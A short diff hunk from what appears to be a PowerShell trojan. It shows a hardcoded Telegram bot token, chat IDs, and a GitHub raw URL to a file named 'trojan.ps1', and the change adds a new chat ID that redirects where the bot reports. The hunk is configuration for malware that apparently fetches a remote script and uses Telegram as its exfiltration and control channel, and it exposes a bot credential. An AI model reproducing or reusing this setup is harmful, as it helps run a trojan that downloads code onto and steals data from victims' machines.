@@ -6,6 +6,7 @@ $PSDefaultParameterValues['Invoke-WebRequest:UseBasicParsing'] = $true
 
 $BotToken = "6760679794:AAFtPTlPHxzcnxrrqNTQF66oT7CraQThfus"
 $ChatID = '6542327314'
+$ChatID = '6617182890'
 $githubScript = 'https://raw.githubusercontent.com/Hiki0611/ROBOT/main/trojan.ps1'
 $ipv4Regex = '^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
 
